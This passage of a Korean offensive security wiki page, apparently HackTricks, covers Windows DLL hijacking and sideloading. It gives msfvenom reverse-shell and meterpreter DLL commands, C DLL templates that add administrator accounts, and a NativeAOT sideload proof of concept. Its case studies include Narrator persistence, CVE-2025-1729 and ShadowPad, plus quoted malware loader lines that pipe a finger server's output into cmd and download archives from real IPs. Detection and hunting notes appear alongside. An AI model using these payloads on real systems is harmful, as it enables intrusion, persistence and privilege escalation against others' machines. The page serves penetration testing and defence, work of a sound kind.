- 2단계: 이를 그럴듯한 **AppData 업데이트** 폴더로 복사하고, 호스트 이름을 `update.exe` 같은 이름으로 바꾼 다음 **scheduled task**를 통해 다시 실행합니다.
- 3단계: 최종 RAT DLL/export를 로드하기 전에 실행 컨텍스트(예: Task Scheduler가 만든 예상 부모 프로세스 `svchost.exe`)를 확인합니다.

헌팅 아이디어:
- 사용자가 쓰기 가능한 위치에서 의심스러운 인접 **`.config`** 파일과 함께 실행되는 서명된 또는 그 밖의 정상적인 **.NET 실행 파일**.
- **`appDomainManagerAssembly`**, **`appDomainManagerType`**, **`probing privatePath="."`**, **`bypassTrustedAppStrongNames`** 또는 **`etwEnable enabled="false"`**가 포함된 `.config` 파일.
- **`%LOCALAPPDATA%`** 또는 앱별 `\bin\update\` 디렉터리에서 이름이 바뀐 업데이트 바이너리를 다시 실행하는 scheduled task.
- scheduled task가 신뢰할 수 있는 .NET 호스트를 실행하고, 해당 호스트가 자신의 디렉터리에서 비공급업체 assembly를 즉시 로드하는 부모/자식 프로세스 체인.

#### Windows 문서에 명시된 DLL 검색 순서 예외

Windows 문서에는 표준 DLL 검색 순서의 몇 가지 예외가 나와 있습니다.

- **메모리에 이미 로드된 DLL과 이름이 같은 DLL**을 만나면 시스템은 일반적인 검색을 건너뜁니다. 대신 리디렉션 및 manifest를 확인한 뒤, 메모리에 이미 로드된 DLL을 기본값으로 사용합니다. **이 경우 시스템은 DLL을 검색하지 않습니다**.
- 현재 Windows 버전의 **known DLL**로 인식된 DLL은 시스템이 해당 known DLL 버전과 그 종속 DLL을 사용하므로 **검색 과정이 생략됩니다**. 레지스트리 키 **HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs**에는 이러한 known DLL 목록이 있습니다.
- **종속성이 있는 DLL**의 경우, 초기 DLL이 전체 경로를 통해 식별되었는지와 상관없이 종속 DLL은 **모듈 이름만 지정된 것처럼** 검색됩니다.

### 권한 상승

**요구 사항**:

- **서로 다른 권한**(수평 또는 측면 이동)으로 실행 중이거나 실행될 프로세스 중 **DLL이 누락된** 프로세스를 찾습니다.
- **DLL**을 검색하는 **디렉터리**에 **쓰기 권한**이 있는지 확인합니다. 이 위치는 실행 파일의 디렉터리이거나 시스템 경로 내의 디렉터리일 수 있습니다.

이러한 전제 조건은 기본적으로 흔치 않습니다. 권한이 높은 실행 파일에 DLL 종속성이 누락되는 경우는 드물고, 일반 사용자는 보통 시스템 검색 경로의 디렉터리에 쓸 수 없습니다. 그래도 잘못 구성된 환경에서는 두 조건이 모두 존재할 수 있습니다.\
요구 사항이 충족되면 [UACME](https://github.com/hfiref0x/UACME) 프로젝트를 확인하세요. 주요 목적은 UAC bypass이지만, 특정 Windows 버전을 위한 DLL hijacking PoC가 포함되어 있어 발견한 쓰기 가능한 디렉터리에 맞게 조정할 수 있는 경우가 많습니다.

다음과 같이 **폴더에 대한 권한을 확인**할 수 있습니다.<sup>[[5]](#references)</sup>

```bash
accesschk.exe -dqv "C:\Python27"
icacls "C:\Python27"
```

또한 **PATH에 포함된 모든 폴더의 권한을 확인하세요**:

```bash
for %%A in ("%path:;=";"%") do ( cmd.exe /c icacls "%%~A" 2>nul | findstr /i "(F) (M) (W) :\" | findstr /i ":\\ everyone authenticated users todos %username%" && echo. )
```

실행 파일의 imports와 dll의 exports도 확인할 수 있습니다:

```bash
dumpbin /imports C:\path\Tools\putty\Putty.exe
dumpbin /export /path/file.dll
```

For **System Path folder**에 쓰기 권한이 있을 때 **DLL Hijacking을 악용해 권한을 상승시키는 방법**에 관한 전체 가이드는 다음을 확인하세요:


{{#ref}}
writable-sys-path-dll-hijacking-privesc.md
{{#endref}}

### 자동화 도구

[**Winpeas** ](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)는 system PATH 내 폴더에 쓰기 권한이 있는지 확인합니다.\
이 취약점을 찾는 데 유용한 다른 자동화 도구로 **PowerSploit functions**인 _Find-ProcessDLLHijack_, _Find-PathDLLHijack_, _Write-HijackDll_이 있습니다.

### 예시

악용 가능한 시나리오를 발견한 경우, 이를 성공적으로 악용하려면 **실행 파일이 해당 DLL에서 import하는 모든 함수를 내보내는 DLL을 만드는 것**이 가장 중요합니다. 참고로 DLL Hijacking은 [Medium Integrity level에서 High로 **(UAC 우회)**](../../authentication-credentials-uac-and-efs/index.html#uac) 또는 [**High Integrity에서 SYSTEM으로**](../index.html#from-high-integrity-to-system)** 권한을 상승시키는 데 유용합니다.** 실행을 위한 DLL hijacking에 초점을 맞춘 이 DLL hijacking 연구에서 **유효한 DLL을 만드는 방법**의 예를 확인할 수 있습니다: [**https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows**](https://www.wietzebeukema.nl/blog/hijacking-dlls-in-windows)**.**\
또한 **다음 섹션**에서는 **템플릿**으로 사용하거나 **필수가 아닌 함수를 내보내는 DLL**을 만드는 데 유용한 **기본 DLL 코드**를 확인할 수 있습니다.

## **DLL 만들기 및 컴파일**

### **DLL Proxifying**

기본적으로 **DLL proxy**는 **로드될 때 악성 코드를 실행**하면서, 실제 라이브러리에 모든 호출을 **전달해** 예상대로 **동작하고 노출하는** DLL입니다.

[**DLLirant**](https://github.com/redteamsocietegenerale/DLLirant) 또는 [**Spartacus**](https://github.com/Accenture/Spartacus) 도구를 사용하면 실행 파일을 **지정하고 proxify할 라이브러리를 선택해 proxified DLL을 생성**하거나, **DLL을 지정해 proxified DLL을 생성**할 수 있습니다.

### **Meterpreter**

**rev shell 획득 (x64):**

```bash
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**meterpreter 획득 (x86):**

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.169.0.100 LPORT=4444 -f dll -o msf.dll
```

**사용자 생성 (x86 버전은 찾지 못했지만 x64 버전은 있음):**

```bash
msfvenom -p windows/adduser USER=privesc PASS=Attacker@123 -f dll -o msf.dll
```

### 직접 만들기

대부분의 경우, 컴파일하는 DLL은 **피해자 프로세스가 가져오는 모든 함수를 export해야 합니다**. 필요한 export가 누락되면 바이너리가 해당 함수를 확인할 수 없어 exploit이 실패합니다.

<details>
<summary>C DLL 템플릿 (Win10)</summary>

```c
// Tested in Win10
// i686-w64-mingw32-g++ dll.c -lws2_32 -o srrstr.dll -shared
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    switch(dwReason){
        case DLL_PROCESS_ATTACH:
            system("whoami > C:\\users\\username\\whoami.txt");
            WinExec("calc.exe", 0); //This doesn't accept redirections like system
            break;
        case DLL_PROCESS_DETACH:
            break;
        case DLL_THREAD_ATTACH:
            break;
        case DLL_THREAD_DETACH:
            break;
    }
    return TRUE;
}
```

</details>

```c
// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved){
    if (dwReason == DLL_PROCESS_ATTACH){
        system("cmd.exe /k net localgroup administrators user /add");
        ExitProcess(0);
    }
    return TRUE;
}
```

<details>
<summary>사용자 생성 기능이 있는 C++ DLL 예제</summary>

```c
//x86_64-w64-mingw32-g++ -c -DBUILDING_EXAMPLE_DLL main.cpp
//x86_64-w64-mingw32-g++ -shared -o main.dll main.o -Wl,--out-implib,main.a

#include <windows.h>

int owned()
{
  WinExec("cmd.exe /c net user cybervaca Password01 ; net localgroup administrators cybervaca /add", 0);
  exit(0);
  return 0;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL,DWORD fdwReason, LPVOID lpvReserved)
{
  owned();
  return 0;
}
```

</details>

<details>
<summary>스레드 진입점을 사용하는 대체 C DLL</summary>

```c
//Another possible DLL
// i686-w64-mingw32-gcc windows_dll.c -shared -lws2_32 -o output.dll

#include<windows.h>
#include<stdlib.h>
#include<stdio.h>

void Entry (){ //Default function that is executed when the DLL is loaded
    system("cmd");
}

BOOL APIENTRY DllMain (HMODULE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call){
        case DLL_PROCESS_ATTACH:
            CreateThread(0,0, (LPTHREAD_START_ROUTINE)Entry,0,0,0);
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DEATCH:
            break;
    }
    return TRUE;
}
```

</details>

### export 호출로 초기화되는 NativeAOT DLL

자체 포함형 **.NET NativeAOT 공유 라이브러리**는 명시적인 `DllMain`을 구현하지 않고도 심어 둔 네이티브 DLL로 사용할 수 있습니다. `[UnmanagedCallersOnly(EntryPoint = "...")]`를 사용해 정적 C# 메서드를 export하면, 네이티브 호스트가 컴파일러가 생성한 진입점 중 하나를 호출할 때 NativeAOT가 모듈을 초기화하고 `[ModuleInitializer]` 메서드가 export된 C# 본문보다 먼저 실행됩니다. 출력물에는 별도로 설치된 .NET 런타임이 필요하지 않습니다.<sup>[[26]](#references)[[27]](#references)[[28]](#references)[[29]](#references)</sup>

DLL에는 선택한 호스트가 실제로 호출하는 **export 이름과 ABI 호환 시그니처**가 필요합니다. 최소한의 스텁만으로도 초기화를 트리거할 수 있지만, export가 누락되면 로드되지 않을 수 있고 시그니처가 잘못되면 호출이 손상될 수 있습니다. 호스트의 import를 확인하고, 출력물 이름을 호스트가 기대하는 종속성 이름으로 변경하기 전에 `dumpbin /exports payload.dll`로 결과를 검증하세요.<sup>[[26]](#references)[[28]](#references)</sup>

<details>
<summary>최소 NativeAOT export DLL</summary>

```csharp
using System;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;

internal static class Bootstrap
{
    [ModuleInitializer]
    internal static void Start()
    {
        File.WriteAllText(Path.Combine(Path.GetTempPath(), "nativeaot-sideload.txt"),
                          Environment.ProcessPath ?? "loaded");
    }
}

public static class Exports
{
    [UnmanagedCallersOnly(EntryPoint = "LoadLibraryShim")]
    public static nint LoadLibraryShim() => 0;
}
```

</details>

프로젝트를 self-contained Windows 네이티브 shared library로 구성합니다:<sup>[[26]](#references)[[27]](#references)</sup>

```xml
<PropertyGroup>
  <TargetFramework>net7.0</TargetFramework>
  <PublishAot>true</PublishAot>
  <NativeLib>Shared</NativeLib>
  <SelfContained>true</SelfContained>
  <RuntimeIdentifier>win-x64</RuntimeIdentifier>
</PropertyGroup>
```

```powershell
dotnet publish .\SideloadPoc.csproj -c Release -r win-x64
dumpbin /exports .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll
Copy-Item .\bin\Release\net7.0\win-x64\publish\SideloadPoc.dll .\<expected-name>.dll
```

이름을 변경한 DLL을 복사한 취약한 실행 파일 옆에 두고, 호환되는 export를 호출하는 코드 경로를 통해 host를 시작합니다. 이 initializer 방식은 복잡한 작업을 `DllMain`에 직접 넣지 않지만, sideload의 전제 조건은 동일합니다. 로더가 이름으로 종속성을 확인하고, 애플리케이션 디렉터리를 선택하며, `KnownDLLs`, 이미 로드된 모듈, SxS 리디렉션 또는 제한된 `LOAD_LIBRARY_SEARCH_*` 플래그를 통해 해당 종속성이 먼저 충족되지 않아야 합니다.<sup>[[26]](#references)[[30]](#references)</sup>

일반적인 native 템플릿은 [Windows C payloads](../windows-c-payloads.md)를 참조하세요. sideload된 first stage는 이후 [process hollowing](../../../reversing/common-api-used-in-malware.md#process-hollowing-aka-runpe)을 수행할 수 있지만, 이는 DLL 확인의 일부가 아니라 별도의 injection technique입니다.

## Detection: DLL masquerading library loads

Elastic Defend 9.5.0은 로드된 파일이 Microsoft 서명이 없고 파일명이 Elastic의 캐시된 Windows/system DLL 이름 인벤토리와 일치할 때, 라이브러리 로드 이벤트에 `dll.Ext.defense_evasions: "DLL Hijack: Masquerading"`을 추가합니다. 이에 따라 파일명 인벤토리, 시스템 위치 및 서명 분석이 endpoint sensor로 이동하므로, 핵심 EQL은 다음과 같이 간소화할 수 있습니다.<sup>[[26]](#references)</sup>

```text
library where host.os.type == "windows" and event.action == "load" and
  dll.Ext.defense_evasions : "DLL Hijack: Masquerading"
```

Treat enrichment as a high-value pivot, not proof by itself. 신뢰도를 높이는 조건은 서명된 host가 자체 **user-writable** 디렉터리에서 DLL을 로드하고, DLL이 서명되지 않았거나 신뢰할 수 없으며, `dll.Ext.relative_file_creation_time`에서 로드 직전에 생성된 것으로 나타나는 경우입니다. 제외 규칙은 정확한 publisher + host process + installation path 조합에만 적용하세요. 충돌하는 DLL 이름을 전역적으로 억제하지 마세요. 정상적인 설치 프로그램과 애플리케이션도 시스템 DLL과 비슷한 이름의 전용 라이브러리를 포함할 수 있습니다.<sup>[[26]](#references)</sup>

이 enrichment를 지원하지 않는 sensor에서는 충돌하는 DLL 이름을 non-system load path, Microsoft 서명 누락/불신, 짧은 파일 생성-로드 간격과 연관 지어 동작을 근사할 수 있습니다. 이를 위해서는 관리되는 DLL 이름 목록과 `%SystemRoot%\\System32`, `SysWOW64`, `WinSxS` 및 기타 승인된 배포 경로에 대한 좁은 범위의 제외 규칙이 필요합니다.<sup>[[26]](#references)</sup>

## 사례 연구: Narrator OneCore TTS Localization DLL Hijack (접근성/AT)

Windows Narrator.exe는 시작 시 예측 가능한 언어별 localization DLL을 계속 확인합니다. 이 DLL을 hijack하면 임의 코드 실행과 persistence가 가능합니다.<sup>[[7]](#references)</sup>

주요 사실
- Probe path (현재 빌드): `%windir%\System32\speech_onecore\engines\tts\msttsloc_onecoreenus.dll` (EN-US).
- Legacy path (이전 빌드): `%windir%\System32\speech\engine\tts\msttslocenus.dll`.
- 공격자가 제어하는 쓰기 가능한 DLL이 OneCore 경로에 있으면 로드되고 `DllMain(DLL_PROCESS_ATTACH)`가 실행됩니다. export는 필요하지 않습니다.

Procmon으로 탐지
- 필터: `Process Name is Narrator.exe` 및 `Operation is Load Image` 또는 `CreateFile`.
- Narrator를 시작하고 위 경로에 대한 로드 시도를 관찰합니다.

최소 DLL
```c
// Build as msttsloc_onecoreenus.dll and place in the OneCore TTS path
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    // Optional OPSEC: DisableThreadLibraryCalls(h);
    // Suspend/quiet Narrator main thread, then run payload
    // (see PoC for implementation details)
  }
  return TRUE;
}
```

OPSEC 침묵
- 단순한 hijack은 UI에서 음성 안내를 하거나 강조 표시를 합니다. 조용히 실행하려면 attach 시 Narrator 스레드를 열거하고, 주 스레드를(`OpenThread(THREAD_SUSPEND_RESUME)`) 연 뒤 `SuspendThread`로 중단하세요. 작업은 자체 스레드에서 계속 진행합니다. 전체 코드는 PoC를 참조하세요.<sup>[[8]](#references)</sup>

Accessibility 구성으로 트리거 및 지속성 설정
- 사용자 컨텍스트(HKCU): `reg add "HKCU\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- Winlogon/SYSTEM(HKLM): `reg add "HKLM\Software\Microsoft\Windows NT\CurrentVersion\Accessibility" /v configuration /t REG_SZ /d "Narrator" /f`
- 위 설정을 사용하면 Narrator를 시작할 때 심어 둔 DLL이 로드됩니다. 보안 데스크톱(로그온 화면)에서 CTRL+WIN+ENTER를 눌러 Narrator를 시작하면 DLL이 보안 데스크톱에서 SYSTEM 권한으로 실행됩니다.

RDP를 통한 SYSTEM 실행 트리거(측면 이동)
- 기본 RDP 보안 계층 허용: `reg add "HKLM\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp" /v SecurityLayer /t REG_DWORD /d 0 /f`
- 호스트에 RDP로 접속한 다음 로그온 화면에서 CTRL+WIN+ENTER를 눌러 Narrator를 실행하면 DLL이 보안 데스크톱에서 SYSTEM 권한으로 실행됩니다.
- RDP 세션이 닫히면 실행이 중단되므로 빠르게 inject/migrate하세요.

Bring Your Own Accessibility (BYOA)
- 기본 제공 Accessibility Tool(AT)의 레지스트리 항목(예: CursorIndicator)을 복제하고, 임의의 바이너리/DLL을 가리키도록 수정한 뒤 가져올 수 있습니다. 그런 다음 `configuration`을 해당 AT 이름으로 설정하면 Accessibility 프레임워크를 통해 임의의 코드를 실행할 수 있습니다.

참고 사항
- `%windir%\System32`에 파일을 쓰고 HKLM 값을 변경하려면 관리자 권한이 필요합니다.
- 모든 payload 로직을 `DLL_PROCESS_ATTACH`에 넣을 수 있으며, export는 필요하지 않습니다.

## 사례 연구: CVE-2025-1729 - TPQMAssistant.exe를 이용한 권한 상승

이 사례는 Lenovo TrackPoint Quick Menu의 `TPQMAssistant.exe`에서 발생한 **Phantom DLL Hijacking**을 다룹니다. 이 취약점은 **CVE-2025-1729**로 추적됩니다.<sup>[[2]](#references)[[3]](#references)</sup>

### 취약점 세부 정보

- **구성 요소**: `C:\ProgramData\Lenovo\TPQM\Assistant\`에 있는 `TPQMAssistant.exe`.
- **예약된 작업**: `Lenovo\TrackPointQuickMenu\Schedule\ActivationDailyScheduleTask`는 매일 오전 9:30에 로그온한 사용자의 컨텍스트로 실행됩니다.
- **디렉터리 권한**: `CREATOR OWNER`가 쓸 수 있어 로컬 사용자가 임의의 파일을 넣을 수 있습니다.
- **DLL 검색 동작**: 작업 디렉터리에서 먼저 `hostfxr.dll`을 로드하려고 시도하며, 해당 DLL이 없으면 "NAME NOT FOUND"를 기록합니다. 이는 로컬 디렉터리를 우선 검색한다는 뜻입니다.

### 익스플로잇 구현

공격자는 같은 디렉터리에 악성 `hostfxr.dll` 스텁을 배치해 누락된 DLL을 악용하고 사용자 컨텍스트에서 코드를 실행할 수 있습니다:

```c
#include <windows.h>

BOOL APIENTRY DllMain(HMODULE hModule, DWORD fdwReason, LPVOID lpReserved) {
    if (fdwReason == DLL_PROCESS_ATTACH) {
        // Payload: display a message box (proof-of-concept)
        MessageBoxA(NULL, "DLL Hijacked!", "TPQM", MB_OK);
    }
    return TRUE;
}
```

### 공격 흐름

1. 표준 사용자로 `hostfxr.dll`을 `C:\ProgramData\Lenovo\TPQM\Assistant\`에 넣습니다.
2. 예약된 작업이 현재 사용자 컨텍스트에서 오전 9시 30분에 실행될 때까지 기다립니다.
3. 작업 실행 시 관리자가 로그인되어 있으면 악성 DLL이 관리자 세션에서 medium integrity로 실행됩니다.
4. 일반적인 UAC bypass 기법을 연계해 medium integrity에서 SYSTEM 권한으로 상승합니다.

## 사례 연구: MSI CustomAction Dropper + 서명된 호스트를 통한 DLL Side-Loading (wsc_proxy.exe)

위협 행위자는 신뢰할 수 있는 서명된 프로세스에서 페이로드를 실행하기 위해 MSI 기반 dropper와 DLL side-loading을 자주 결합합니다.<sup>[[10]](#references)</sup>

체인 개요
- 사용자가 MSI를 다운로드합니다. GUI 설치 중 CustomAction이 조용히 실행되어(예: LaunchApplication 또는 VBScript 작업) 포함된 리소스에서 다음 단계를 재구성합니다.
- dropper는 정상적으로 서명된 EXE와 악성 DLL을 같은 디렉터리에 기록합니다(예시 조합: Avast가 서명한 wsc_proxy.exe + 공격자가 제어하는 wsc.dll).
- 서명된 EXE가 시작되면 Windows DLL 검색 순서에 따라 작업 디렉터리의 wsc.dll이 먼저 로드되어, 서명된 부모 프로세스에서 공격자 코드를 실행합니다(ATT&CK T1574.001).

MSI 분석(확인할 항목)
- CustomAction 테이블:
  - 실행 파일이나 VBScript를 실행하는 항목을 찾습니다. 의심스러운 패턴의 예: 백그라운드에서 포함된 파일을 실행하는 LaunchApplication.
  - Orca (Microsoft Orca.exe)에서 CustomAction, InstallExecuteSequence 및 Binary 테이블을 확인합니다.
- MSI CAB에 포함된/분할된 페이로드:
  - 관리용 추출: msiexec /a package.msi /qb TARGETDIR=C:\out
  - 또는 lessmsi 사용: lessmsi x package.msi C:\out
  - VBScript CustomAction이 여러 개의 작은 조각을 이어 붙이고 복호화하는지 확인합니다. 일반적인 흐름:

```vb
' VBScript CustomAction (high level)
' 1) Read multiple fragment files from the embedded CAB (e.g., f0.bin, f1.bin, ...)
' 2) Concatenate with ADODB.Stream or FileSystemObject
' 3) Decrypt using a hardcoded password/key
' 4) Write reconstructed PE(s) to disk (e.g., wsc_proxy.exe and wsc.dll)
```

wsc_proxy.exe를 이용한 실제 sideloading
- 다음 두 파일을 같은 폴더에 넣습니다:
  - wsc_proxy.exe: 정상적으로 서명된 host(Avast). 프로세스는 해당 디렉터리에서 이름으로 wsc.dll을 로드하려고 합니다.
  - wsc.dll: 공격자 DLL. 특정 exports가 필요하지 않으면 DllMain만으로 충분합니다. 그렇지 않으면 proxy DLL을 빌드하고, DllMain에서 payload를 실행하는 동시에 필요한 exports를 정품 라이브러리로 전달합니다.
- 최소한의 DLL payload를 빌드합니다:

```c
// x64: x86_64-w64-mingw32-gcc payload.c -shared -o wsc.dll
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE h, DWORD r, LPVOID) {
  if (r == DLL_PROCESS_ATTACH) {
    WinExec("cmd.exe /c whoami > %TEMP%\\wsc_sideload.txt", SW_HIDE);
  }
  return TRUE;
}
```

- export 요구 사항에는 proxying framework(예: DLLirant/Spartacus)를 사용해 payload도 실행하는 forwarding DLL을 생성합니다.

- 이 기법은 host binary의 DLL 이름 확인 방식에 의존합니다. host가 절대 경로나 안전한 로딩 플래그(예: LOAD_LIBRARY_SEARCH_SYSTEM32/SetDefaultDllDirectories)를 사용하면 hijack이 실패할 수 있습니다.
- KnownDLLs, SxS, forwarded exports는 우선순위에 영향을 줄 수 있으므로 host binary와 export set을 선택할 때 고려해야 합니다.

## 서명된 triad와 암호화된 payload(ShadowPad 사례 연구)

Check Point는 Ink Dragon이 합법적인 소프트웨어에 섞여 보이면서 핵심 payload를 디스크에서 암호화된 상태로 유지하기 위해 **3개 파일로 구성된 triad**를 사용해 ShadowPad를 배포한다고 설명했습니다:<sup>[[12]](#references)</sup>

1. **서명된 host EXE** – AMD, Realtek, NVIDIA 같은 공급업체가 악용됩니다(`vncutil64.exe`, `ApplicationLogs.exe`, `msedge_proxyLog.exe`). 공격자는 실행 파일의 이름을 Windows 바이너리처럼 보이도록 바꾸지만(예: `conhost.exe`), Authenticode 서명은 유효하게 유지됩니다.
2. **악성 loader DLL** – EXE 옆에 예상되는 이름으로 드롭됩니다(`vncutil64loc.dll`, `atiadlxy.dll`, `msedge_proxyLogLOC.dll`). DLL은 보통 ScatterBrain framework로 난독화된 MFC 바이너리이며, 암호화된 blob을 찾고 복호화한 뒤 ShadowPad를 reflective 방식으로 매핑하는 역할만 합니다.
3. **암호화된 payload blob** – 같은 디렉터리에 `<name>.tmp`로 저장되는 경우가 많습니다. 복호화한 payload를 메모리에 매핑한 뒤 loader는 TMP 파일을 삭제해 포렌식 증거를 없앱니다.

Tradecraft 참고 사항:

* 서명된 EXE의 이름을 바꾸면(PE header의 원래 `OriginalFileName`은 유지) 공급업체 서명을 보존하면서 Windows 바이너리로 가장할 수 있습니다. 따라서 Ink Dragon이 `conhost.exe`처럼 보이지만 실제로는 AMD/NVIDIA 유틸리티인 바이너리를 드롭하는 습관을 재현합니다.
* 실행 파일은 계속 신뢰된 상태로 유지되므로, 대부분의 allowlisting 제어에서는 악성 DLL을 그 옆에 두기만 하면 됩니다. loader DLL을 맞춤화하는 데 집중하세요. 서명된 상위 파일은 보통 수정 없이 실행할 수 있습니다.
* ShadowPad의 decryptor는 TMP blob이 loader 옆에 있고 파일을 쓸 수 있어야 매핑 후 파일을 0으로 덮어쓸 수 있습니다. payload가 로드될 때까지 디렉터리를 쓰기 가능 상태로 유지하세요. 메모리에 로드된 뒤에는 OPSEC를 위해 TMP 파일을 안전하게 삭제할 수 있습니다.

### LOLBAS stager + staged archive sideloading 체인 (finger → tar/curl → WMI)

운영자는 DLL sideloading을 LOLBAS와 결합해 디스크에 남는 사용자 지정 산출물을 신뢰된 EXE 옆의 악성 DLL 하나뿐이게 합니다:<sup>[[1]](#references)</sup>

- **원격 명령 loader (Finger):** 숨겨진 PowerShell이 `cmd.exe /c`를 실행하고 Finger 서버에서 명령을 가져와 `cmd`로 파이프 전달합니다:

  ```powershell
  powershell.exe Start-Process cmd -ArgumentList '/c finger Galo@91.193.19.108 | cmd' -WindowStyle Hidden
  ```
  - `finger user@host`는 TCP/79 텍스트를 가져옵니다. `| cmd`는 서버 응답을 실행하므로, 공격자는 서버 측에서 second stage를 교체할 수 있습니다.

- **내장 다운로드/압축 해제:** 무해한 확장자를 사용해 archive를 다운로드하고 압축을 해제한 다음, sideload 대상과 DLL을 임의의 `%LocalAppData%` 폴더에 배치합니다:

  ```powershell
  $base = "$Env:LocalAppData"; $dir = Join-Path $base (Get-Random); curl -s -L -o "$dir.pdf" 79.141.172.212/tcp; mkdir "$dir"; tar -xf "$dir.pdf" -C "$dir"; $exe = "$dir\intelbq.exe"
  ```
  - `curl -s -L`은 진행 상황을 숨기고 리디렉션을 따릅니다. `tar -xf`는 Windows에 내장된 tar를 사용합니다.

- **WMI/CIM 실행:** WMI를 통해 EXE를 시작하면, 함께 배치된 DLL을 로드하는 동안 텔레메트리에 CIM이 생성한 프로세스로 표시됩니다:

  ```powershell
  Invoke-CimMethod -ClassName Win32_Process -MethodName Create -Arguments @{CommandLine = "`"$exe`""}
  ```
  - 로컬 DLL을 우선 사용하는 바이너리(예: `intelbq.exe`, `nearby_share.exe`)에서 동작합니다. payload(예: Remcos)는 신뢰된 이름으로 실행됩니다.

- **Hunting:** `/p`, `/m`, `/c`가 함께 나타나는 `forfiles`에 경고를 설정합니다. 관리자 스크립트 외에는 드물게 사용됩니다.


## 사례 연구: NSIS dropper + Bitdefender Submission Wizard sideload (Chrysalis)

최근 Lotus Blossom 침입 사례에서는 신뢰된 업데이트 체인을 악용해 NSIS로 패킹된 dropper를 전달했습니다. 이 dropper는 DLL sideload와 메모리에서만 동작하는 payload를 배치했습니다.<sup>[[13]](#references)</sup>

공격 흐름
- `update.exe` (NSIS)는 `%AppData%\Bluetooth`를 만들고 **HIDDEN**으로 표시한 뒤, 이름을 바꾼 Bitdefender Submission Wizard `BluetoothService.exe`, 악성 `log.dll`, 암호화된 blob `BluetoothService`를 드롭하고 EXE를 실행합니다.
- 호스트 EXE는 `log.dll`을 import하고 `LogInit`/`LogWrite`를 호출합니다. `LogInit`은 blob을 mmap으로 로드하고, `LogWrite`는 사용자 지정 LCG 기반 스트림(상수 **0x19660D** / **0x3C6EF35F**, 이전 해시에서 파생한 키 자료 사용)으로 이를 복호화합니다. 이후 버퍼를 평문 shellcode로 덮어쓰고, 임시 데이터를 해제한 다음 해당 코드로 점프합니다.
- IAT를 피하기 위해 loader는 **FNV-1a basis 0x811C9DC5 + prime 0x1000193**를 사용해 export 이름을 해싱한 뒤, Murmur 스타일 avalanche(**0x85EBCA6B**)를 적용하고 salt가 추가된 대상 해시와 비교해 API를 확인합니다.

주요 shellcode (Chrysalis)
- 키 `gQ2JR&9;`를 사용해 5회에 걸쳐 add/XOR/sub를 반복하며 PE와 유사한 메인 모듈을 복호화한 다음, `Kernel32.dll` → `GetProcAddress`를 동적으로 로드해 import 확인을 완료합니다.
- 문자별 bit-rotate/XOR 변환으로 런타임에 DLL 이름 문자열을 재구성한 다음 `oleaut32`, `advapi32`, `shlwapi`, `user32`, `wininet`, `ole32`, `shell32`를 로드합니다.
- 두 번째 resolver는 **PEB → InMemoryOrderModuleList**를 순회하고, 각 export table을 4바이트 블록 단위로 파싱해 Murmur 스타일 mixing을 적용합니다. 해시를 찾지 못한 경우에만 `GetProcAddress`로 대체합니다.

내장된 구성 및 C2
- 구성은 드롭된 `BluetoothService` 파일의 **offset 0x30808**(size **0x980**)에 있으며, 키 `qwhvb^435h&*7`로 RC4 복호화하면 C2 URL과 User-Agent가 드러납니다.
- Beacon은 점으로 구분된 호스트 프로필을 만들고, 앞에 태그 `4Q`를 붙인 다음 키 `vAuig34%^325hGV`로 RC4 암호화해 HTTPS를 통해 `HttpSendRequestA`로 전송합니다. 응답은 RC4 복호화한 뒤 태그 switch로 분기합니다(`4T` shell, `4V` 프로세스 실행, `4W/4X` 파일 쓰기, `4Y` 읽기/유출, `4\\` 제거, `4` 드라이브/파일 열거 및 청크 전송 case).
- 실행 모드는 CLI args로 제어됩니다. 인자가 없으면 `-i`를 가리키는 서비스/Run key persistence를 설치하고, `-i`는 `-k`를 사용해 자신을 다시 실행하며, `-k`는 설치를 건너뛰고 payload를 실행합니다.

관찰된 대체 loader
- 같은 침입에서 Tiny C Compiler도 드롭하고, `C:\ProgramData\USOShared\`에서 `svchost.exe -nostdlib -run conf.c`를 실행했습니다. `libtcc.dll`은 그 옆에 있었습니다. 공격자가 제공한 C 소스에는 shellcode가 포함되어 있었으며, 이를 컴파일해 메모리에서 실행함으로써 PE를 디스크에 쓰지 않았습니다. 다음과 같이 재현합니다:

```cmd
C:\ProgramData\USOShared\tcc.exe -nostdlib -run conf.c
```

- 이 TCC 기반 컴파일 및 실행 단계는 런타임에 `Wininet.dll`을 가져오고 하드코딩된 URL에서 2단계 shellcode를 가져와, 컴파일러가 실행되는 것처럼 위장하는 유연한 loader를 제공했습니다.

## Export proxying 및 host thread parking을 이용한 서명된 호스트 sideloading

일부 DLL sideloading 체인은 **안정성 강화**를 추가해, 악성 DLL이 로드된 뒤 충돌하는 대신 나중 단계가 문제없이 로드될 때까지 정상 호스트가 실행 상태를 유지하게 합니다.<sup>[[11]](#references)</sup>

관찰된 패턴
- 신뢰할 수 있는 EXE를 예상되는 종속성 이름(예: `version.dll`)을 사용하는 악성 DLL 옆에 배치합니다.
- 악성 DLL은 예상되는 모든 export를 실제 시스템 DLL(예: `%SystemRoot%\\System32\\version.dll`)로 **proxying**하므로 import 확인이 계속 성공하고 호스트 프로세스가 정상 작동합니다.
